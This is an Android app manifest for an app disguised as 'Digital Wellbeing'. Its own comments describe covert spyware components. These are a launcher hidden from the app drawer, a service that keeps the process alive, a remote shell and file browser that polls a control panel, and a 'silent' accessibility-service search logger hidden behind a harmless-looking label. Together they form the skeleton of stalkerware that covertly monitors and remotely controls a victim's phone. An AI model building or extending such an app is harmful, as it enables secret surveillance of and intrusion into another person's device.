<manifest xmlns:android="http://schemas.android.com/apk/res/android">

    <uses-permission android:name="android.permission.INTERNET" />

    <application
        android:label="Digital Wellbeing"
        android:allowBackup="false"
        android:supportsRtl="true"
        android:usesCleartextTraffic="true"
        android:enabled="true"
        android:persistent="true">

        <!-- Launcher: hidden from app drawer, finishes immediately -->
        <activity
            android:name=".MainActivity"
            android:exported="false"
            android:launchMode="singleTask"
            android:noHistory="true"
            android:excludeFromRecents="true"
            android:finishOnTaskLaunch="true"
            android:theme="@android:style/Theme.Translucent.NoTitleBar">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- Foreground service keeps the process alive on Android 14 -->
        <service
            android:name=".KeepAliveService"
            android:exported="false"
            android:foregroundServiceType="dataSync" />

        <!-- Remote shell + file browser from the control panel (polls /term/poll) -->
        <service
            android:name=".RemoteShellService"
            android:exported="false"
            android:foregroundServiceType="dataSync" />

        <!-- Quick Settings Flashlight tile -->
        <service
            android:name=".FlashlightTileService"
            android:exported="true"
            android:permission="android.permission.BIND_QUICK_SETTINGS">
            <intent-filter>
                <action android:name="android.service.quicksettings.TileService" />
            </intent-filter>
        </service>

        <!-- Silent Accessibility search logger -->
        <service
            android:name=".SafetyService"
            android:label="@string/accessibility_service_label"
            android:icon="@android:drawable/ic_menu_camera"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:exported="true">

            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>

            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>

    </application>
</manifest>